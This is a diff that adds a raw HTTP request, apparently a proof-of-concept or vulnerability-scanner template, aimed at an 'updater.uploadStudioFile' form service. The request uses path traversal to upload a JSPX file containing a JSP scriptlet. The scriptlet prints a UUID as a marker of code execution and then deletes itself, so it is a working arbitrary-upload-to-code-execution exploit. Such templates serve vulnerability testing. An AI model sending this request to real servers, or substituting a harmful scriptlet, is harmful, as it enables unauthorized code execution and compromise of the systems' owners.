@@ -1,0 +1,5 @@
+POST /formservice?service=updater.uploadStudioFile HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+
+content=<updater xmlns:jsp="http://java.sun.com/JSP/Page"><filename>test.jspx</filename><filepath>../../../images/</filepath><filesize>347</filesize><lmtime>{{time()}}</lmtime><jsp:scriptlet>out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();</jsp:scriptlet></updater>
